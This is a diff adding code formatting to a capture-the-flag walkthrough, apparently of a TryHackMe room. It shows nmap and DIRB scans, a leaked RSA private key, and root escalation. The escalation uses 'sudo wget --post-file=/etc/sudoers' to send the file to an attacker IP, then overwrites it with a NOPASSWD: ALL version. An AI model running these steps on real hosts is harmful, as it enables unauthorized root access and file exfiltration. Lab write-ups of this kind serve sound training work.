@@ -10,7 +10,7 @@ So, we first use a tool called [`NMap`](https://www.varonis.com/blog/nmap-comman
 
 ### `nmap -T4 -A -v {IP Address}`
 
-python
+```python
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 00:34 India Standard Time
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -64,7 +64,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
 --------------------------TRUNCATED------------------------------
-
+```
 
 From the above results we find out majorly *2 Ports are active*:
 
@@ -91,7 +91,7 @@ After going through the source code of the page, we find:
 Here we use a tool called [`DIRB`](https://tools.kali.org/web-applications/dirb#:~:text=DIRB%20is%20a%20Web%20Content,server%20and%20analyzing%20the%20response.) (Directory Buster). It shows us possible directory routes on this portal.
 #### DIRB returned some awesome data:
 -----------------
-python
+```python
 DIRB v2.22
 By The Dark Raver
 -----------------
@@ -140,13 +140,14 @@ GENERATED WORDS: 4612
 -----------------
 END_TIME: Fri Jun 25 01:12:03 2021
 DOWNLOADED: 9224 - FOUND: 3
+```
 
 *Looks like we have hit a Jackpot*
 
 `http://10.10.3.112/sitemap/.ssh/`
 
 #### On browsing to that URL, we find a private RSA key for a user's SSH
-
+```
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
 m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
@@ -174,6 +175,8 @@ eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
 QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
 jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
 -----END RSA PRIVATE KEY-----
+```
+
 
 ## FootHold
  Footholding is getting a basic control over a system with minimum privileges to execute a reverse shell or read/write private information.
@@ -229,8 +232,9 @@ Start a reverse shell listener on your attacking machine. So as to create a comm
 nc -lvnp 80
 
 And then we will write this :
-SH
+```SH
 jessie@CorpOne:~$ sudo wget --post-file=/etc/sudoers {YOUR THM provided IP}
+```
 
 The wget command sends the `/etc/sudoers` file to the provided IP.
 
@@ -293,13 +297,13 @@ Edit out the `NOPASSWD: /usr/bin/wget` Portion to `NOPASSWD: ALL` using ONLY `VI
 
 And download it back to victim machine
 
-SH
+```SH
 URL=http://{YOUR-IP alloted from THM}/sudoer2
 LFILE=/etc/sudoers
 sudo wget $URL -O $LFILE
+```
 
-
-BASH
+```BASH
 jessie@CorpOne:~$ sudo -i
 root@CorpOne:~# ls -la
 total 28
@@ -312,7 +316,7 @@ drwxr-xr-x  2 root root 4096 oct 26  2019 .nano
 -rw-r--r--  1 root root   33 oct 26  2019 root_flag.txt
 root@CorpOne:~# cat root_flag.txt
 b1b968b37519ad1daa6408188649263d
-
+```
 
 
 # VOILA!!
